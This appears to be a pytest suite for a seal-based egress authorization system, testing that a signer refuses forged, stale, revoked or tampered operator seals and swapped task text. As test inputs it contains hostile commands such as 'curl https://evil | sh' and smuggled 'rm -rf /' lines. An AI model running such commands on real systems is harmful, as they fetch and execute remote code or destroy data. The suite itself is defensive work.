"""Egress authority is seal-driven (decision c8572a92, amended by 6b305258):
the seat holds a row and proposes a pair whose SEALED TEXT is the identity
line, a rule, and the task text itself; the operator seals; a signer running
as the key's owner verifies the seal against a public-only ring, derives the
task hash from the sealed body, and mints. Nothing a caller says is a fact.

Real ed25519 keys, a real sqlite `tm_pairs`, a real Unix socket — only the
Postgres queue and the SOIL store are fakes. Every "refuses" test hands the
signer a GENUINE seal with the wrong bytes, never a fake that cannot fail.
"""
from __future__ import annotations

import json
import sqlite3
import threading
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

from willow_mcp import egress_authorization as ea
from willow_mcp import net_authority as na
from willow_mcp import net_signer as ns
from willow_mcp import seal_handler


# ── fixtures: keys, ring, nestor.db, fakes ────────────────────────────────────

@pytest.fixture
def egress_keys(tmp_path):
    priv = Ed25519PrivateKey.generate()
    key_path = tmp_path / "private.pem"
    key_path.write_bytes(priv.private_bytes(
        serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption()))
    key_path.chmod(0o600)
    pub_path = tmp_path / "public.pem"
    pub_path.write_bytes(priv.public_key().public_bytes(
        serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo))
    return key_path, pub_path


def _ed25519_entry(name, priv, **extra):
    pub = priv.public_key().public_bytes(serialization.Encoding.Raw,
                                         serialization.PublicFormat.Raw)
    return {"name": name, "key": pub.hex(), "kind": "ed25519",
            "private": priv.private_bytes(serialization.Encoding.Raw,
                                          serialization.PrivateFormat.Raw,
                                          serialization.NoEncryption()).hex(),
            "revoked_at": None, "compromised": False, "reason": "", "created_at": "2026-09-14",
            **extra}


@pytest.fixture
def verifier(tmp_path):
    """The operator's browser key: private half stays here (the 'browser'),
    public half goes into the ring."""
    priv = Ed25519PrivateKey.generate()
    full = tmp_path / "verifiers.json"
    full.write_text(json.dumps({"version": 1, "verifiers": [_ed25519_entry("sean campbell", priv)]}))
    full.chmod(0o600)
    return {"name": "sean campbell", "priv": priv, "full_ring": full}


_NOW = datetime(2026, 9, 20, 23, 0, 0, tzinfo=timezone.utc)


def _seal(verifier, source_norm: str, target_text: str, *, at=None) -> dict:
    sig = verifier["priv"].sign(ns.seal_message(source_norm, target_text, verifier["name"])).hex()
    return {"source_norm": source_norm, "target_text": target_text,
            "verifier": verifier["name"], "seal_sig": sig,
            "created_at": (at or _NOW).isoformat()}


def _fresh(verifier, source_norm, text):
    return _seal(verifier, source_norm, text, at=datetime.now(timezone.utc))


def _nestor_db(tmp_path) -> Path:
    db = tmp_path / "nestor.db"
    conn = sqlite3.connect(db)
    conn.executescript("""
        CREATE TABLE tm_pairs (
            id TEXT PRIMARY KEY, source_text TEXT NOT NULL, source_norm TEXT NOT NULL,
            source_lang TEXT NOT NULL, target_text TEXT NOT NULL, target_lang TEXT NOT NULL,
            status TEXT NOT NULL DEFAULT 'draft', verifier TEXT NOT NULL DEFAULT '',
            weight REAL NOT NULL DEFAULT 1.0, origin TEXT NOT NULL DEFAULT '',
            created_at TEXT NOT NULL, seal_sig TEXT NOT NULL DEFAULT '',
            reason TEXT NOT NULL DEFAULT '', superseded_by TEXT NOT NULL DEFAULT '',
            visibility TEXT NOT NULL DEFAULT 'internal');
    """)
    conn.commit()
    conn.close()
    return db


def _put_pair(db, pair_id, source_norm, target_text, *, status="draft", verifier="",
              seal_sig="", superseded_by="", created_at=None):
    conn = sqlite3.connect(db)
    conn.execute(
        "INSERT INTO tm_pairs (id, source_text, source_norm, source_lang, target_text, target_lang,"
        " status, verifier, created_at, seal_sig, superseded_by) VALUES (?,?,?,?,?,?,?,?,?,?,?)",
        (pair_id, source_norm, source_norm, "decision", target_text, "decision", status, verifier,
         (created_at or _NOW).isoformat(), seal_sig, superseded_by))
    conn.commit()
    conn.close()


def _seal_in_db(db, pair_id, verifier, seal: dict):
    conn = sqlite3.connect(db)
    conn.execute("UPDATE tm_pairs SET status='sealed', verifier=?, seal_sig=?, created_at=? "
                 "WHERE id=?", (verifier["name"], seal["seal_sig"], seal["created_at"], pair_id))
    conn.commit()
    conn.close()


class _FakeStore:
    def __init__(self):
        self.rows: dict[tuple[str, str], dict] = {}

    def put(self, collection, record, record_id=None, deviation=0.0):
        rid = record_id or "auto"
        self.rows[(collection, rid)] = {**record, "_id": rid}
        return rid, "work_quiet"

    def get(self, collection, record_id):
        return self.rows.get((collection, record_id))

    def update(self, collection, record_id, record, deviation=0.0):
        self.rows[(collection, record_id)] = {**record, "_id": record_id}
        return record_id

    def all(self, collection):
        return [r for (c, _), r in self.rows.items() if c == collection]


class _FakePg:
    """Just enough of a cursor for hold/drain: INSERT records values, SELECT
    of held rows answers, UPDATE releases or expires."""

    def __init__(self):
        self.tasks: dict[str, dict] = {}
        self.commits = 0

    def cursor(self):
        pg = self

        class Cur:
            rowcount = 0

            def execute(self, sql, params=()):
                s = " ".join(sql.split())
                if s.startswith("INSERT INTO tasks"):
                    cols = [c.strip('" ') for c in s[s.index("(") + 1:s.index(")")].split(",")]
                    pg.tasks[params[0]] = dict(zip(cols, params))
                    self._rows = []
                elif s.startswith("SELECT"):
                    cols = [c.strip('" ') for c in s[len("SELECT "):s.index(" FROM")].split(",")]
                    self._rows = [tuple(r.get(c) for c in cols) for r in pg.tasks.values()
                                  if r.get("status") == params[0]]
                elif s.startswith("UPDATE tasks") and "network_authorization" in s:
                    envelope, new_status, task_id, held = params
                    row = pg.tasks.get(task_id)
                    if row and row.get("status") == held:
                        row["network_authorization"] = envelope
                        row["status"] = new_status
                        self.rowcount = 1
                    else:
                        self.rowcount = 0
                elif s.startswith("UPDATE tasks"):
                    new_status, task_id, held = params
                    row = pg.tasks.get(task_id)
                    if row and row.get("status") == held:
                        row["status"] = new_status
                        self.rowcount = 1
                    else:
                        self.rowcount = 0
                else:
                    raise AssertionError(sql)

            def fetchall(self):
                return self._rows

            def fetchone(self):
                return self._rows[0] if self._rows else None

            def close(self):
                pass

        return Cur()

    def commit(self):
        self.commits += 1


_COLS = {"task_id": "task_id", "task": "task", "status": "status", "agent": "agent",
         "submitted_by": "submitted_by", "lane": "lane",
         "network_authorization": "network_authorization"}
_FIELDS = {k: {"column": v} for k, v in _COLS.items()}


def _ring(verifier, tmp_path) -> dict:
    out = tmp_path / "verifiers.public.json"
    ns.export_public_ring(verifier["full_ring"], out)
    return ns.load_public_ring(out)


def _held(pg, store, *, task="curl https://example.invalid\n# allow_net", app_id="willow",
          agent="kart", propose=None):
    def _propose(app, record_id, store=None, db_path=None):
        return {"pair_id": f"pair-{record_id}", "record_id": record_id, "status": "draft"}
    return na.hold_and_propose(pg=pg, fields=_FIELDS, app_id=app_id, agent=agent, task=task,
                               lane="fast", scope=ea.NETWORK_SCOPE, ttl_seconds=600,
                               write_param=lambda f, v: v, store=store,
                               propose=propose or _propose)


def _bound(task_id="ABCD2345", agent="kart", submitted_by="willow", ttl="600",
           nonce=None, scope="network"):
    return {"task_id": task_id, "agent": agent, "submitted_by": submitted_by,
            "scope": scope, "ttl": ttl, "nonce": nonce or ("q" * 32)}


class _Ledger:
    def __init__(self):
        self.rows = []

    def append(self, project, event, content):
        self.rows.append((project, event, content))
        return f"frank-{len(self.rows)}"


def _stamp(store, record_id, pair_id):
    gov = store.get(seal_handler.GOVERNANCE_COLLECTION, record_id)
    gov["nestor_pair_id"] = pair_id
    store.update(seal_handler.GOVERNANCE_COLLECTION, record_id, gov)


def _signer(egress_keys, verifier, tmp_path):
    key, _ = egress_keys
    return ns.Signer(private_key_path=key, ring=_ring(verifier, tmp_path))


# ── the sealed text ───────────────────────────────────────────────────────────

def test_sealed_text_carries_the_body_and_no_hash_and_splits_back():
    bound = _bound()
    text = na.sealed_text(bound, "curl https://x\n# allow_net")
    line, rule, *_ = text.split("\n")
    assert line.startswith("willow-net-auth-v2 task_id=ABCD2345 ")
    assert "task_hash" not in line and rule == na.SEALED_RULE
    assert na.split_sealed_text(text) == (bound, "curl https://x\n# allow_net")
    assert na.parse_bound_line(line) == bound
    assert na.parse_bound_line(line + " task_hash=" + "a" * 64) is None
    assert na.split_sealed_text(line) is None                      # no rule, no body
    assert na.split_sealed_text(line + "\nx\n---\ny") is None       # rule not on line 2
    assert na.split_sealed_text(text + "\n---\nsmuggled") is None  # a second rule


def test_hold_refuses_a_task_that_contains_the_rule_line():
    pg, store = _FakePg(), _FakeStore()
    out = _held(pg, store, task="echo hi\n---\nrm -rf /\n# allow_net")
    assert out["error"].startswith("net_hold_denied") and "rule" in out["error"]
    assert pg.tasks == {}


# ── the public-only ring ──────────────────────────────────────────────────────

def test_export_ring_keeps_only_ed25519_public_halves_and_load_refuses_secrets(verifier, tmp_path):
    mixed = tmp_path / "mixed.json"
    hmac_secret = "ab" * 32
    mixed.write_text(json.dumps({"version": 1, "legacy_key": "cd" * 32, "verifiers": [
        json.loads(verifier["full_ring"].read_text())["verifiers"][0],
        {"name": "old-shared", "key": hmac_secret, "kind": "hmac"},
    ]}))
    out = tmp_path / "pub.json"
    exported = ns.export_public_ring(mixed, out)
    data = json.loads(out.read_text())
    assert exported["verifiers"] == ["sean campbell"]
    assert exported["skipped"] == [{"name": "old-shared", "kind": "hmac"}]
    assert hmac_secret not in out.read_text() and "cd" * 32 not in out.read_text()
    assert all("private" not in v for v in data["verifiers"]) and "legacy_key" not in data
    assert data["public_only"] is True
    assert list(ns.load_public_ring(out)) == ["sean campbell"]
    with pytest.raises(ValueError, match="private half"):
        ns.load_public_ring(verifier["full_ring"])
    hm = tmp_path / "hm.json"
    hm.write_text(json.dumps({"verifiers": [{"name": "s", "key": hmac_secret, "kind": "hmac"}]}))
    with pytest.raises(ValueError, match="shared secret"):
        ns.load_public_ring(hm)
    with pytest.raises(ValueError, match="no ed25519 verifier"):
        ns.export_public_ring(hm, tmp_path / "never.json")
    assert not (tmp_path / "never.json").exists()


def test_ring_must_not_be_writable_by_the_signer(tmp_path, verifier, monkeypatch):
    from willow_mcp import lease

    out = tmp_path / "pub.json"
    ns.export_public_ring(verifier["full_ring"], out)
    ok, why = ns.ring_is_trustworthy(out)            # tmp dir is ours: replaceable
    assert not ok and "writable or replaceable" in why
    monkeypatch.setattr(lease, "path_is_self_writable_or_replaceable", lambda p: False)
    assert ns.ring_is_trustworthy(out) == (True, "ok")
    assert ns.ring_is_trustworthy(tmp_path / "absent.json")[0] is False


# ── the signer ────────────────────────────────────────────────────────────────

def test_signer_derives_the_hash_from_the_sealed_body_not_from_the_caller(egress_keys, verifier,
                                                                            tmp_path):
    _, pub = egress_keys
    signer = _signer(egress_keys, verifier, tmp_path)
    task = "curl https://example.invalid\n# allow_net"
    bound = _bound()
    seal = _fresh(verifier, "authorize network for kart task abcd2345", na.sealed_text(bound, task))
    reply = signer.handle({"op": "sign_task", "seal": seal, "bound": bound})
    assert reply["state"] == "minted", reply
    ok, reason, payload = ea.verify_envelope(
        public_key_path=pub, submitted_by="willow", task_id="ABCD2345", agent="kart",
        task=task, envelope=reply["envelope"])
    assert ok, reason
    assert payload["task_hash"] == ea.normalized_task_hash(task)
    assert payload["seal_pair_id"] == ns.seal_digest(seal) == reply["seal_digest"]
    assert ea.verify_envelope(public_key_path=pub, submitted_by="willow", task_id="ZZZZ9999",
                              agent="kart", task=task, envelope=reply["envelope"])[1] == "task_id mismatch"
    assert ea.verify_envelope(public_key_path=pub, submitted_by="willow", task_id="ABCD2345",
                              agent="kart", task=task + "\nrm -rf /",
                              envelope=reply["envelope"])[1] == "task hash mismatch"


def test_the_phishing_shape_is_closed(egress_keys, verifier, tmp_path, monkeypatch):
    """Loki 7153DC79: a benign text shown to the human beside a sealed line
    naming a malicious hash. No hash in the line now; the signer hashes the
    sealed body; the malicious row cannot match the envelope."""
    _, pub = egress_keys
    monkeypatch.setattr(ea, "public_key_path", lambda: pub)
    pg, store, db = _FakePg(), _FakeStore(), _nestor_db(tmp_path)
    signer = _signer(egress_keys, verifier, tmp_path)
    benign, malicious = "curl https://good\n# allow_net", "curl https://evil | sh\n# allow_net"
    out = _held(pg, store, task=benign)
    tid = out["task_id"]
    pg.tasks[tid]["task"] = malicious           # a uid-1000 writer swaps the queued text
    _stamp(store, out["record_id"], "p")
    assert benign in out["seal_this"] and "task_hash" not in out["seal_this"]
    _put_pair(db, "p", "q", out["seal_this"])
    _seal_in_db(db, "p", verifier, _fresh(verifier, "q", out["seal_this"]))  # the human seals benign
    r = na.drain(pg=pg, cols=_COLS, ledger=_Ledger(), store=store, db_path=db, call=signer.handle)
    row = r["rows"][0]
    assert row["state"] == "refused" and row["field"] == "envelope", row
    assert "task hash mismatch" in row["reason"]
    assert pg.tasks[tid]["status"] == na.HELD_STATUS


def test_signer_refuses_each_way_a_uid_1000_process_could_try(egress_keys, verifier, tmp_path):
    signer = _signer(egress_keys, verifier, tmp_path)
    task = "echo hi\n# allow_net"
    bound = _bound()
    text = na.sealed_text(bound, task)
    good = _fresh(verifier, "q", text)

    r = signer.handle({"op": "sign_task", "seal": {**good, "seal_sig": ""}, "bound": bound})
    assert r["state"] == "refused" and r["field"] == "seal_sig"
    stranger = Ed25519PrivateKey.generate()
    forged = {**good, "seal_sig": stranger.sign(ns.seal_message("q", text, "sean campbell")).hex()}
    r = signer.handle({"op": "sign_task", "seal": forged, "bound": bound})
    assert r["state"] == "refused" and r["field"] == "seal_sig"
    # a genuine signature over DIFFERENT bytes than the ones presented
    other = _fresh(verifier, "q", na.sealed_text(bound, "echo other\n# allow_net"))
    r = signer.handle({"op": "sign_task", "seal": {**good, "seal_sig": other["seal_sig"]},
                       "bound": bound})
    assert r["state"] == "refused" and r["field"] == "seal_sig"
    r = signer.handle({"op": "sign_task", "seal": {**good, "verifier": "mallory"}, "bound": bound})
    assert r["state"] == "refused" and r["field"] == "verifier"
    r = signer.handle({"op": "sign_task", "seal": _fresh(verifier, "q", "yes, do it"), "bound": bound})
    assert r["state"] == "refused" and r["field"] == "target_text"
    for field, value in (("agent", "loki"), ("nonce", "z" * 32), ("submitted_by", "hanuman"),
                         ("ttl", "601"), ("task_id", "ZZZZ9999"), ("scope", "database")):
        r = signer.handle({"op": "sign_task", "seal": good, "bound": {**bound, field: value}})
        assert r["state"] == "refused" and r["field"] == field, (field, r)
    # caller-supplied facts outside the seal are refused by name, unread
    for extra in ("task", "task_text", "task_hash", "pair_id"):
        r = signer.handle({"op": "sign_task", "seal": good, "bound": bound, extra: "x"})
        assert r["state"] == "refused" and r["field"] == extra, (extra, r)
    r = signer.handle({"op": "sign_task", "seal": good, "bound": {**bound, "task_hash": "a" * 64}})
    assert r["state"] == "refused" and r["field"] == "bound"
    r = signer.handle({"op": "sign_task", "seal": {**good, "pair_id": "p"}, "bound": bound})
    assert r["state"] == "refused" and r["field"] == "pair_id"


def test_signer_refuses_revoked_compromised_stale_and_future_seals(egress_keys, verifier, tmp_path):
    key, _ = egress_keys
    bound = _bound()
    text = na.sealed_text(bound, "x\n# allow_net")
    fresh = _fresh(verifier, "q", text)

    ring = _ring(verifier, tmp_path)
    ring["sean campbell"]["compromised"] = True
    r = ns.Signer(private_key_path=key, ring=ring).handle({"op": "sign_task", "seal": fresh, "bound": bound})
    assert r["state"] == "refused" and r["field"] == "verifier" and "compromised" in r["reason"]

    ring = _ring(verifier, tmp_path)
    ring["sean campbell"]["revoked_at"] = "2026-09-19T00:00:00+00:00"   # rotated, not stolen
    r = ns.Signer(private_key_path=key, ring=ring).handle({"op": "sign_task", "seal": fresh, "bound": bound})
    assert r["state"] == "refused" and r["field"] == "verifier" and "revoked" in r["reason"]

    signer = _signer(egress_keys, verifier, tmp_path)
    stale = _seal(verifier, "q", text, at=datetime.now(timezone.utc) - timedelta(days=2))
    r = signer.handle({"op": "sign_task", "seal": stale, "bound": bound})
    assert r["state"] == "refused" and r["field"] == "created_at" and "older" in r["reason"]
    future = _seal(verifier, "q", text, at=datetime.now(timezone.utc) + timedelta(hours=1))
    r = signer.handle({"op": "sign_task", "seal": future, "bound": bound})
    assert r["state"] == "refused" and r["field"] == "created_at" and "future" in r["reason"]
    r = signer.handle({"op": "sign_task", "seal": {**fresh, "created_at": ""}, "bound": bound})
    assert r["state"] == "refused" and r["field"] == "created_at"


def test_signer_mints_a_lease_from_the_sealed_reason(egress_keys, verifier, tmp_path, monkeypatch):
    from willow_mcp import lease as lease_mod

    key, _ = egress_keys
    apps = tmp_path / "apps"
    monkeypatch.setenv("WILLOW_MCP_APPS_ROOT", str(apps))
    signer = ns.Signer(private_key_path=key, ring=_ring(verifier, tmp_path), lease_root=apps)
    bound = {"app_id": "willow", "ttl": "1800", "scope": "lease"}
    text = na.sealed_lease_text(bound, "Friday morning fun")
    r = signer.handle({"op": "sign_lease", "seal": _fresh(verifier, "grant", text), "bound": bound})
    assert r["state"] == "minted", r
    state = lease_mod.read_lease("willow")
    assert state["status"] == "active" and state["issuer"] == "seal:sean campbell"
    assert state["reason"] == "Friday morning fun"
    # the reason is inside the sealed bytes: a seal over a different reason carries THAT reason
    text2 = na.sealed_lease_text(bound, "something else")
    r = signer.handle({"op": "sign_lease", "seal": _fresh(verifier, "grant", text2), "bound": bound})
    assert r["state"] == "minted" and lease_mod.read_lease("willow")["reason"] == "something else"
    r = signer.handle({"op": "sign_lease", "seal": _fresh(verifier, "grant", text),
                       "bound": {**bound, "app_id": "loki"}})
    assert r["state"] == "refused" and r["field"] == "app_id"
    # a task seal presented as a lease seal is not a lease
    r = signer.handle({"op": "sign_lease", "seal": _fresh(verifier, "q", na.sealed_text(_bound(), "x")),
                       "bound": bound})
    assert r["state"] == "refused" and r["field"] == "target_text"


# ── the socket ────────────────────────────────────────────────────────────────

@pytest.fixture
def live_signer(egress_keys, verifier, tmp_path):
    key, pub = egress_keys
    sock = tmp_path / "sock"
    signer = ns.Signer(private_key_path=key, ring=_ring(verifier, tmp_path))
    ready, stop = threading.Event(), threading.Event()
    t = threading.Thread(target=ns.serve, args=(signer, sock),
                         kwargs={"ready": ready, "stop": stop}, daemon=True)
    t.start()
    assert ready.wait(5)
    yield sock, pub
    stop.set()
    t.join(5)


def test_socket_round_trip_and_three_states(live_signer, verifier, tmp_path):
    sock, pub = live_signer
    task = "wget https://x\n# allow_net"
    bound = _bound()
    seal = _fresh(verifier, "q", na.sealed_text(bound, task))
    reply = na.signer_call({"op": "sign_task", "seal": seal, "bound": bound}, path=sock)
    assert reply["state"] == "minted"
    ok, _, payload = ea.verify_envelope(public_key_path=pub, submitted_by="willow", task_id="ABCD2345",
                                        agent="kart", task=task, envelope=reply["envelope"])
    assert ok and payload["task_hash"] == ea.normalized_task_hash(task)
    # a genuine seal, wrong bytes on the wire -> refused over the socket
    reply = na.signer_call({"op": "sign_task", "seal": {**seal, "target_text": seal["target_text"] + " "},
                            "bound": bound}, path=sock)
    assert reply["state"] == "refused" and reply["field"] == "seal_sig"
    reply = na.signer_call({"op": "sign_task", "seal": seal, "bound": {**bound, "agent": "loki"}},
                           path=sock)
    assert reply["state"] == "refused" and reply["field"] == "agent"
    for extra in ("task", "task_hash", "pair_id"):
        reply = na.signer_call({"op": "sign_task", "seal": seal, "bound": bound, extra: "x"}, path=sock)
        assert reply["state"] == "refused" and reply["field"] == extra
    reply = na.signer_call({"op": "sign_task"}, path=tmp_path / "absent")
    assert reply["state"] == "unreachable" and "socket" in reply


# ── request: hold and propose ─────────────────────────────────────────────────

def test_hold_inserts_an_unclaimable_row_and_proposes_the_sealed_text():
    pg, store = _FakePg(), _FakeStore()
    out = _held(pg, store)
    assert out["status"] == na.HELD_STATUS and out["pair_id"].startswith("pair-net-auth-")
    row = pg.tasks[out["task_id"]]
    assert row["status"] == na.HELD_STATUS and row["submitted_by"] == "willow"
    bound, body = na.split_sealed_text(out["seal_this"])
    assert bound["task_id"] == out["task_id"] and body == row["task"]
    assert "task_hash" not in out["seal_this"]
    gov = store.get(seal_handler.GOVERNANCE_COLLECTION, na.record_id_for_task(out["task_id"]))
    assert gov["ruling"] == out["seal_this"] and gov["held_at"]
    assert gov["kind"] == "net-authorization-request" and "task_hash" not in gov


def test_hold_does_not_insert_when_the_propose_fails():
    pg, store = _FakePg(), _FakeStore()
    out = _held(pg, store, propose=lambda *a, **k: {"error": "nestor_unavailable"})
    assert out["error"].startswith("net_hold_denied: nestor_unavailable")
    assert pg.tasks == {}


def test_propose_lease_seals_the_reason_inside_the_text():
    store = _FakeStore()
    out = na.propose_lease(app_id="willow", ttl_seconds=1800, reason="Friday morning fun",
                           store=store,
                           propose=lambda app, rid, store=None, db_path=None: {"pair_id": "pl"})
    assert out["status"] == "proposed"
    bound, reason = na.split_sealed_lease_text(out["seal_this"])
    assert bound == {"app_id": "willow", "ttl": "1800", "scope": "lease"}
    assert reason == "Friday morning fun"


# ── act: the tick ─────────────────────────────────────────────────────────────

def test_tick_waits_on_a_draft_refuses_a_forged_seal_mints_on_a_real_one(egress_keys, verifier,
                                                                           tmp_path, monkeypatch):
    _, pub = egress_keys
    monkeypatch.setattr(ea, "public_key_path", lambda: pub)
    pg, store, db = _FakePg(), _FakeStore(), _nestor_db(tmp_path)
    ledger = _Ledger()
    signer = _signer(egress_keys, verifier, tmp_path)

    out = _held(pg, store)
    tid, rid = out["task_id"], out["record_id"]
    _stamp(store, rid, "pair-1")
    _put_pair(db, "pair-1", "q", out["seal_this"])  # draft, unsealed

    r = na.drain(pg=pg, cols=_COLS, ledger=ledger, store=store, db_path=db, call=signer.handle)
    assert r["state"] == "populated" and r["rows"][0]["state"] == "waiting"
    assert r["rows"][0]["why"] == "status=draft"
    assert pg.tasks[tid]["status"] == na.HELD_STATUS and ledger.rows == []

    # a stranger's signature written into the db as if sealed: refused, inked
    stranger = Ed25519PrivateKey.generate()
    fake = {"seal_sig": stranger.sign(ns.seal_message("q", out["seal_this"], "sean campbell")).hex(),
            "created_at": datetime.now(timezone.utc).isoformat()}
    _seal_in_db(db, "pair-1", verifier, fake)
    r = na.drain(pg=pg, cols=_COLS, ledger=ledger, store=store, db_path=db, call=signer.handle)
    assert r["rows"][0]["state"] == "refused" and r["rows"][0]["field"] == "seal_sig"
    assert ledger.rows[-1][1] == na.EVENT_REFUSED and pg.tasks[tid]["status"] == na.HELD_STATUS

    # the operator seals it for real
    _seal_in_db(db, "pair-1", verifier, _fresh(verifier, "q", out["seal_this"]))
    r = na.drain(pg=pg, cols=_COLS, ledger=ledger, store=store, db_path=db, call=signer.handle)
    row = r["rows"][0]
    assert row["state"] == "minted" and row["released_to"] == "pending", row
    assert pg.tasks[tid]["status"] == "pending"
    ok, reason, payload = ea.verify_envelope(
        public_key_path=pub, submitted_by="willow", task_id=tid, agent="kart",
        task=pg.tasks[tid]["task"], envelope=pg.tasks[tid]["network_authorization"])
    assert ok and payload["seal_pair_id"] == row["seal_digest"]
    assert ledger.rows[-1][1] == na.EVENT_MINTED
    assert ledger.rows[-1][2]["pair_id"] == "pair-1" and ledger.rows[-1][2]["verifier"] == "sean campbell"
    assert ledger.rows[-1][2]["seal_digest"] == row["seal_digest"]

    r = na.drain(pg=pg, cols=_COLS, ledger=ledger, store=store, db_path=db, call=signer.handle)
    assert r["state"] == "empty"


def test_tick_refuses_a_row_that_drifted_from_its_seal_and_inks_it(egress_keys, verifier, tmp_path,
                                                                     monkeypatch):
    _, pub = egress_keys
    monkeypatch.setattr(ea, "public_key_path", lambda: pub)
    pg, store, db = _FakePg(), _FakeStore(), _nestor_db(tmp_path)
    ledger = _Ledger()
    signer = _signer(egress_keys, verifier, tmp_path)
    out = _held(pg, store)
    tid, rid = out["task_id"], out["record_id"]
    _stamp(store, rid, "pair-2")
    _put_pair(db, "pair-2", "q", out["seal_this"])
    _seal_in_db(db, "pair-2", verifier, _fresh(verifier, "q", out["seal_this"]))
    pg.tasks[tid]["agent"] = "loki"              # the row's agent changes under the seal
    r = na.drain(pg=pg, cols=_COLS, ledger=ledger, store=store, db_path=db, call=signer.handle)
    row = r["rows"][0]
    assert row["state"] == "refused" and row["field"] == "agent"
    assert pg.tasks[tid]["status"] == na.HELD_STATUS
    assert ledger.rows[-1][1] == na.EVENT_REFUSED and ledger.rows[-1][2]["field"] == "agent"


def test_tick_expires_a_held_row_nobody_sealed(egress_keys, verifier, tmp_path, monkeypatch):
    _, pub = egress_keys
    monkeypatch.setattr(ea, "public_key_path", lambda: pub)
    pg, store, db = _FakePg(), _FakeStore(), _nestor_db(tmp_path)
    ledger = _Ledger()
    out = _held(pg, store)
    tid = out["task_id"]
    _stamp(store, out["record_id"], "pair-old")
    _put_pair(db, "pair-old", "q", out["seal_this"])
    later = datetime.now(timezone.utc) + timedelta(seconds=na.HELD_MAX_AGE_S + 1)
    r = na.drain(pg=pg, cols=_COLS, ledger=ledger, store=store, db_path=db,
                 call=lambda req: pytest.fail("signer must not be called for a stale row"), now=later)
    row = r["rows"][0]
    assert row["state"] == "refused" and row["field"] == "age"
    assert pg.tasks[tid]["status"] == na.EXPIRED_STATUS
    assert ledger.rows[-1][1] == na.EVENT_REFUSED and ledger.rows[-1][2]["field"] == "age"
    # just inside the cap: still waiting
    pg2, store2 = _FakePg(), _FakeStore()
    out2 = _held(pg2, store2)
    _stamp(store2, out2["record_id"], "pair-old")
    r = na.drain(pg=pg2, cols=_COLS, store=store2, db_path=db, call=lambda req: {"state": "unreachable"},
                 now=datetime.now(timezone.utc) + timedelta(seconds=na.HELD_MAX_AGE_S - 60))
    assert r["rows"][0]["state"] == "waiting"


def test_tick_three_state_on_the_signer_and_the_seal_store(egress_keys, verifier, tmp_path,
                                                             monkeypatch):
    key, pub = egress_keys
    monkeypatch.setattr(ea, "public_key_path", lambda: pub)
    pg, store, db = _FakePg(), _FakeStore(), _nestor_db(tmp_path)
    out = _held(pg, store)
    _stamp(store, out["record_id"], "pair-3")
    _put_pair(db, "pair-3", "q", out["seal_this"])
    _seal_in_db(db, "pair-3", verifier, _fresh(verifier, "q", out["seal_this"]))
    r = na.drain(pg=pg, cols=_COLS, store=store, db_path=db,
                 call=lambda req: {"state": "unreachable", "cause": "ECONNREFUSED", "socket": "/x"})
    assert r["rows"][0]["state"] == "unreachable" and r["counts"]["unreachable"] == 1
    assert pg.tasks[out["task_id"]]["status"] == na.HELD_STATUS
    r = na.drain(pg=pg, cols=_COLS, store=store, db_path=tmp_path / "nope.db",
                 call=lambda req: pytest.fail("signer must not be called"))
    assert r["rows"][0]["state"] == "unreachable"
    # a signer that returns a GENUINELY SIGNED envelope for a different row
    def wrong_signer(req):
        return {"state": "minted", "envelope": ea.sign_envelope(
            private_key_path=key, submitted_by="willow", task_id="ZZZZ9999", agent="kart",
            task_hash="a" * 64, ttl_seconds=60, nonce="n" * 32)}
    r = na.drain(pg=pg, cols=_COLS, store=store, db_path=db, call=wrong_signer)
    assert r["rows"][0]["state"] == "refused" and r["rows"][0]["field"] == "envelope"
    assert pg.tasks[out["task_id"]]["status"] == na.HELD_STATUS
    assert r["inked"] is False


def test_superseded_or_unsigned_pair_is_waiting_not_minted(tmp_path, verifier):
    db = _nestor_db(tmp_path)
    _put_pair(db, "a", "q", "t", status="sealed", verifier="v", seal_sig="ab", superseded_by="b")
    _put_pair(db, "b", "q", "t", status="sealed", verifier="v", seal_sig="")
    assert na.read_sealed_pair("a", db)["why"] == "superseded"
    assert na.read_sealed_pair("b", db)["why"] == "unsigned"
    assert na.read_sealed_pair("c", db)["why"] == "pair_absent"
    assert na.read_sealed_pair("a", tmp_path / "missing.db")["state"] == "unreachable"
    _put_pair(db, "d", "q", "t", status="sealed", verifier="v", seal_sig="ab")
    assert na.read_sealed_pair("d", db)["created_at"] == _NOW.isoformat()


# ── the executor: a seal stands in for the lease, only after verifying ────────

def test_executor_accepts_a_seal_minted_envelope_without_a_standing_lease(egress_keys, monkeypatch):
    from willow_mcp import consent, gate, lease

    key, pub = egress_keys
    monkeypatch.setattr(gate, "permitted", lambda app, perm: True)
    monkeypatch.setattr(consent, "internet_permitted", lambda: True)
    monkeypatch.setattr(lease, "active", lambda app: False)
    monkeypatch.setattr(lease, "strict_trust_root", lambda: True)
    monkeypatch.setattr(lease, "self_writable_trust_paths", lambda app: [])
    monkeypatch.setattr(lease, "path_is_self_writable_or_replaceable", lambda p: False)
    monkeypatch.setattr(ea, "public_key_path", lambda: pub)
    monkeypatch.setattr(ea, "_row_blocks_net_authorization", lambda tid: None)
    monkeypatch.setattr(ea, "_consume_row_net_authorization", lambda tid: True)

    class Row:
        submitted_by, task_id, agent, task = "willow", "ABCD2345", "kart", "x\n# allow_net"

    sealed = ea.sign_envelope(private_key_path=key, submitted_by="willow", task_id="ABCD2345",
                              agent="kart", task_hash=ea.normalized_task_hash(Row.task),
                              ttl_seconds=60, nonce="n" * 32, seal_pair_id="d" * 64)
    terminal = ea.sign_envelope(private_key_path=key, submitted_by="willow", task_id="ABCD2345",
                                agent="kart", task=Row.task, ttl_seconds=60, nonce="m" * 32)
    auth = ea.ExecutorNetworkAuthorizer()
    assert auth(Row(), sealed) is True
    assert auth(Row(), terminal) is False and auth.last_error == "egress lease denied"
    parsed = json.loads(terminal)
    parsed["payload"]["seal_pair_id"] = "d" * 64          # an unsigned claim of a seal
    assert auth(Row(), json.dumps(parsed)) is False and auth.last_error == "invalid signature"
    other = ea.sign_envelope(private_key_path=key, submitted_by="willow", task_id="ABCD2345",
                             agent="kart", task_hash=ea.normalized_task_hash("y\n# allow_net"),
                             ttl_seconds=60, nonce="n" * 32, seal_pair_id="d" * 64)
    assert auth(Row(), other) is False and auth.last_error == "task hash mismatch"


def test_sign_envelope_needs_exactly_one_of_task_or_hash(egress_keys):
    key, _ = egress_keys
    with pytest.raises(ValueError):
